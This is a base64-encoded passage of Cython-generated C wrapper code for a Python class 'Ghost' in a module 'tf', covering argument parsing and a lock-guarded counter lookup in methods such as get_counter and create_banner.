QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3Quc2V0X2FjdGl2ZV90aHJlYWRzIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfN2dldF9jb3VudGVyKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnRmXzVHaG9zdF83Z2V0X2NvdW50ZXIgPSB7ImdldF9jb3VudGVyIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydGZfNUdob3N0XzdnZXRfY291bnRlciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzdnZXRfY291bnRlcihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3Zfa2V5ID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9iamVjdCogdmFsdWVzWzJdID0gezAsMH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2V0X2NvdW50ZXIgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2tleSwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAyOgogICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiZ2V0X2NvdW50ZXIiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZ2V0X2NvdW50ZXIiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDIpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MM19lcnJvcikKICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07CiAgICBfX3B5eF92X2tleSA9IHZhbHVlc1sxXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZ2V0X2NvdW50ZXIiLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmdldF9jb3VudGVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ydGZfNUdob3N0XzZnZXRfY291bnRlcihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3Zfa2V5KTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzZnZXRfY291bnRlcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9rZXkpIHsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF82OwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBpbnQgX19weXhfdF8xMTsKICBpbnQgX19weXhfdF8xMjsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZXRfY291bnRlciIsIDApOwoKICAKICAgewogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2NrKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4MywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wzX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzYgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICBhc3NlcnQoX19weXhfdF80KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzYgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9OwogICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDgzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgIHsKICAgICAgewogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF83LCAmX19weXhfdF84LCAmX19weXhfdF85KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTsKICAgICAgICAgewoKICAgICAgICAgIAogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY291bnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MN19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X3Zfa2V5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0w3X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIF9fcHl4X3IgPSBfX3B5eF90XzM7CiAgICAgICAgICBfX3B5eF90XzMgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MMTFfdHJ5X3JldHVybjsKCiAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgX19weXhfTDdfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5nZXRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8zLCAmX19weXhfdF8xLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA4MywgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgX19weXhfdF80ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMywgX19weXhfdF8xLCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4MywgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X3RfNCwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDgzLCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIGlmIChfX3B5eF90XzExIDwgKDApKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fcHl4X3RfMTIgPSAoIV9fcHl4X3RfMTEpOwogICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTIpKSB7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzEpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpOwogICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMywgX19weXhfdF8xLCBfX3B5eF90XzUpOwogICAgICAgICAgICBfX3B5eF90XzMgPSAwOyAgX19weXhfdF8xID0gMDsgIF9fcHl4X3RfNSA9IDA7IAogICAgICAgICAgICBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgICAgICBfX3B5eF9MMTFfdHJ5X3JldHVybjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgZ290byBfX3B5eF9MNF9yZXR1cm47CiAgICAgICAgX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICB9CiAgICB9CiAgICAgewogICAgICB7CiAgICAgICAgaWYgKF9fcHl4X3RfMikgewogICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgODMsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MNjsKICAgICAgfQogICAgICBfX3B5eF9MNF9yZXR1cm46IHsKICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF9yOwogICAgICAgIF9fcHl4X3IgPSAwOwogICAgICAgIGlmIChfX3B5eF90XzIpIHsKICAgICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDgzLCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3IgPSBfX3B5eF90Xzk7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wwOwogICAgICB9CiAgICAgIF9fcHl4X0w2OjsKICAgIH0KICAgIGdvdG8gX19weXhfTDE2OwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDE2OjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmdldF9jb3VudGVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfOWNyZWF0ZV9iYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzljcmVhdGVfYmFubmVyID0geyJjcmVhdGVfYmFubmVyIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydGZfNUdob3N0XzljcmVhdGVfYmFubmVyLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfOWNyZWF0ZV9iYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjcmVhdGVfYmFubmVyICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcm